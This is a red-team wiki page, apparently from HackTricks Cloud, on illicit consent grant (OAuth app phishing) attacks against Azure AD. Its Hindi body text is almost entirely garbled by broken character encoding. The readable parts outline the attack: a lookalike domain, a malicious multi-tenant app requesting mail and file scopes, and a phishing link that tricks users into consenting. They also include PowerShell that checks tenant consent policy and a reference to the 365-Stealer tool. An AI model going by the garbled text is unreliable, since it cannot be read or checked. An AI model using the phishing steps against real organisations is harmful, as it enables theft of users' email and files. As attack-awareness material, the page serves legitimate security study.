# Az - Illicit Consent Grant

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## OAuth App Phishing

**Azure Applications** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ (рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА, рд▓реЗрдХрд┐рди рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ, рдИрдореЗрд▓ рднреЗрдЬрдиреЗ...) рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддреЗ рд╣реИрдВред\
рдпрджрд┐ **рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ**, рддреЛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ **"рдХрдо рдкреНрд░рднрд╛рд╡" рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред **рд╕рднреА рдЕрдиреНрдп** рдорд╛рдорд▓реЛрдВ рдореЗрдВ, **рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреА рд╕рд╣рдорддрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**ред\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` рдФрд░ рдПрдХ рдХрд╕реНрдЯрдо рднреВрдорд┐рдХрд╛ рдЬрд┐рд╕рдореЗрдВ `рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐` рд╢рд╛рдорд┐рд▓ рд╣реИ, рдкреВрд░реЗ рдЯреЗрдиреЗрдЯ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдХреЗрд╡рд▓ рд╡реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЬреЛ **рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреА рд╕рд╣рдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА** рдЙрдиреНрд╣реЗрдВ **рдХрдо рдкреНрд░рднрд╛рд╡** рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд░реНрдЧреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ **рдмреБрдирд┐рдпрд╛рджреА рд╕рд╛рдЗрди-рдЗрди рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВ рдЬреИрд╕реЗ openid, profile, email, User.Read рдФрд░ offline_access**ред рдпрджрд┐ рдПрдХ **рд╕рдВрдЧрдарди** **рд╕рднреА рдРрдкреНрд╕ рдХреЗ рд▓рд┐рдП** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╣рдорддрд┐ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рддреЛ рдПрдХ рдХрд░реНрдордЪрд╛рд░реА рдПрдХ рдРрдк рдХреЛ **рдЕрдкрдиреЗ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕реЗ рдЙрдкрд░реЛрдХреНрдд рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ**ред

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рджреБрд╖реНрдЯ рдРрдк** рддреИрдпрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рдлрд┐рд╢рд┐рдВрдЧ** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдРрдк рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдФрд░ рдЙрд╕рдХрд╛ рдбреЗрдЯрд╛ рдЪреБрд░рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### 2 Types of Illicit Consent Grant Attacks

* **Unauthenticated**: рдПрдХ рдмрд╛рд╣рд░реА рдЦрд╛рддреЗ рд╕реЗ `User.Read` рдФрд░ `User.ReadBasic.All` рдЬреИрд╕реЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдмрдирд╛рдПрдВ, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлрд┐рд╢ рдХрд░реЗрдВ, рдФрд░ рдЖрдк рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред
* рдпрд╣ рдлрд┐рд╢ рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмрд╛рд╣рд░реА рд╡рд╛рддрд╛рд╡рд░рдг рд╕реЗ OAuth рдРрдкреНрд╕ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ!
* **Authenticated**: рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдкреНрд░рдореБрдЦ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЦрд╛рддреЗ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдмрдирд╛рдПрдВ рдФрд░ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлрд┐рд╢ рдХрд░реЗрдВ рдЬреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд OAuth рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЕрдиреБрдорддрд┐ `User.ReadBasic.All` рдЕрдм рджрд┐рд▓рдЪрд╕реНрдк рдирд╣реАрдВ рд╣реИред
* рдЖрдк рд╕рдВрднрд╡рддрдГ **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЛ рджреЗрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**, рдХреНрдпреЛрдВрдХрд┐ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ OAuth рдРрдкреНрд╕ рдХреЛ рдХреЛрдИ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗ рд╕рдХрддрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ **рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдлрд┐рд╢ рдХрд░рдирд╛ рд╣реЛрдЧрд╛** (рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЛ рджреЗрдиреЗ рд╡рд╛рд▓реА рднреВрдорд┐рдХрд╛рдУрдВ/рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрд╛рдж рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА)

### Check if users allowed to consent

Azure Active Directory (Azure AD) рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдкрд░ рд╕рд╣рдорддрд┐ рджреЗрдиреЗ рдХреА рдЙрдирдХреА рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рд╕рд╣рдорддрд┐ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд PowerShell рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╣рдорддрд┐ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ**: рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдиреЗ рд╕реЗ рд░реЛрдХрддреА рд╣реИред рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╣рдорддрд┐ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИред
* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдкреНрд░рдХрд╛рд╢рдХреЛрдВ рдпрд╛ рдЖрдкрдХреЗ рд╕рдВрдЧрдарди рд╕реЗ рдРрдкреНрд╕ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ рдЙрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЪреБрдирддреЗ рд╣реИрдВ**: рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХреЗрд╡рд▓ рдЙрди рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬреЛ рдПрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдкреНрд░рдХрд╛рд╢рдХ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдП рдЧрдП рд╣реИрдВ рдФрд░ рдЖрдкрдХреЗ рдЕрдкрдиреЗ рдЯреЗрдиреЗрдЯ рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ рд╣реИрдВред рдпрд╣ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдХрд░ рдирд┐рдпрдВрддреНрд░рдг рдХреА рдПрдХ рдкрд░рдд рдЬреЛрдбрд╝рддрд╛ рд╣реИред
* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рднреА рдРрдкреНрд╕ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ**: рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдЕрдзрд┐рдХ рдЙрджрд╛рд░ рд╣реИ рдФрд░ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХрд┐рд╕реА рднреА рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рднреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрдм рддрдХ рдХрд┐ рдЙрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рд╕рд╣рдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред
* **рдХрд╕реНрдЯрдо рдРрдк рд╕рд╣рдорддрд┐ рдиреАрддрд┐**: рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдЗрдВрдЧрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдПрдХ рдХрд╕реНрдЯрдо рдиреАрддрд┐ рд▓рд╛рдЧреВ рд╣реИ, рдЬрд┐рд╕реЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рдВрдЧрдардирд╛рддреНрдордХ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдореЗрдВ рдРрдк рдкреНрд░рдХрд╛рд╢рдХ, рдРрдк рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрд░реЛрдзрд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдФрд░ рдЕрдиреНрдп рдХрд╛рд░рдХреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХрд╛ рд╕рдВрдпреЛрдЬрди рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

## **рдЧреИрд░рдХрд╛рдиреВрдиреА рд╕рд╣рдорддрд┐ рдЕрдиреБрджрд╛рди рд╣рдорд▓реЗ рдХреЛ рд╕рдордЭрдирд╛**

рдЧреИрд░рдХрд╛рдиреВрдиреА рд╕рд╣рдорддрд┐ рдЕрдиреБрджрд╛рди рд╣рдорд▓реЗ рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдЕрдВрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ Azure рдХреЗ рд╕рд╛рде рдкрдВрдЬреАрдХреГрдд рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗрддреЗ рд╣реИрдВред рдпрд╣ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд╡реИрдз рджрд┐рдЦрд╛рдХрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреАрдбрд╝рд┐рдд рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ "рд╕реНрд╡реАрдХреГрдд рдХрд░реЗрдВ" рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░ рджреЗрддреЗ рд╣реИрдВред рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, Azure AD рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╕рд╛рдЗрдЯ рдХреЛ рдПрдХ рдЯреЛрдХрди рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдкреАрдбрд╝рд┐рдд рдХреЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдФрд░ рдЙрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ, рдЬреИрд╕реЗ рдИрдореЗрд▓ рдкрдврд╝рдирд╛ рдпрд╛ рднреЗрдЬрдирд╛ рдФрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛, рдмрд┐рдирд╛ рдХрд┐рд╕реА рд╕рдВрдЧрдардирд╛рддреНрдордХ рдЦрд╛рддреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗред

## **рд╣рдорд▓реЗ рдХрд╛ рдкреНрд░рд╡рд╛рд╣ рдЕрд╡рд▓реЛрдХрди**

рд╣рдорд▓рд╛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдХрдВрдкрдиреА рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХрдИ рдЪрд░рдгреЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИред рдпрд╣ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

1. **рдбреЛрдореЗрди рдкрдВрдЬреАрдХрд░рдг рдФрд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рд╣реЛрд╕реНрдЯрд┐рдВрдЧ**: рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╕рд╛рдЗрдЯ рдХреЗ рд╕рдорд╛рди рдбреЛрдореЗрди рдкрдВрдЬреАрдХреГрдд рдХрд░рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, "safedomainlogin.com"ред рдЗрд╕ рдбреЛрдореЗрди рдХреЗ рддрд╣рдд, рдПрдХ рдЙрдкрдбреЛрдореЗрди рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ, "companyname.safedomainlogin.com") рдЬреЛ рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд╣реЛрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЛрдб рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкрд╣реБрдБрдЪ рдЯреЛрдХрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред
2. **Azure AD рдореЗрдВ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдкрдВрдЬреАрдХрд░рдг**: рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ Azure AD рдЯреЗрдиреЗрдЯ рдореЗрдВ рдПрдХ рдорд▓реНрдЯреА-рдЯреЗрдиреЗрдЯ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдкрдВрдЬреАрдХреГрдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рд▓рдХреНрд╖рд┐рдд рдХрдВрдкрдиреА рдХреЗ рдирд╛рдо рдкрд░ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рд╡реИрдз рджрд┐рдЦреЗред рд╡реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ URL рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд╣реЛрд╕реНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдбреЛрдореЗрди рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рддреЗ рд╣реИрдВред
3. **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рд╕реЗрдЯрд┐рдВрдЧ**: рд╣рдорд▓рд╛рд╡рд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд╡рд┐рднрд┐рдиреНрди API рдЕрдиреБрдорддрд┐рдпреЛрдВ (рдЬреИрд╕реЗ, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`) рдХреЗ рд╕рд╛рде рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред рдпреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ, рдПрдХ рдмрд╛рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рджреА рдЧрдИ, рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдУрд░ рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВред
4. **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд▓рд┐рдВрдХ рд╡рд┐рддрд░рд┐рдд рдХрд░рдирд╛**: рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд▓рд┐рдВрдХ рддреИрдпрд╛рд░ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рдЖрдИрдбреА рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд▓рдХреНрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рд╕рд╛рдЭрд╛ рдХрд░рддрд╛ рд╣реИ, рдЙрдиреНрд╣реЗрдВ рд╕рд╣рдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗрддрд╛ рд╣реИред

## **рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛**

рд╣рдорд▓реЗ рдХреЛ [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рдкреВрд░реНрд╡-рд╣рдорд▓рд╛ рддреИрдпрд╛рд░реА:

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреАрдбрд╝рд┐рдд рд╕рдВрдЧрдарди рдореЗрдВ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рддрдХ рдХреБрдЫ рд╕реНрддрд░ рдХреА рдкрд╣реБрдБрдЪ рд╣реИ, рддреЛ рд╡реЗ рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рд╕рдВрдЧрдарди рдХреА рдиреАрддрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдРрдкреНрд╕ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
рдЕрдЯреИрдХ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдЕрдкрдиреЗ Azure рдЯреЗрдиреЗрдЯ рдореЗрдВ рдПрдХ рдирдпрд╛ рдРрдк рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛** (рдРрдк рд░рдЬрд┐рд╕реНрдЯреНрд░реЗрд╢рди рдореЗрдВ), рдЬрд┐рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` `Microsoft Graph` рдореЗрдВ `Delegated permissions` рдХреЗ рдЕрдВрддрд░реНрдЧрдд рд╣реИред (рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╣рдореЗрд╢рд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдореЛрджрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

* `User.ReadBasic.All` рд╡рд╣ рдЕрдиреБрдорддрд┐ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ **рд╕рдВрдЧрдарди рдХреЗ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧреА рдпрджрд┐ рдЗрд╕реЗ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ред
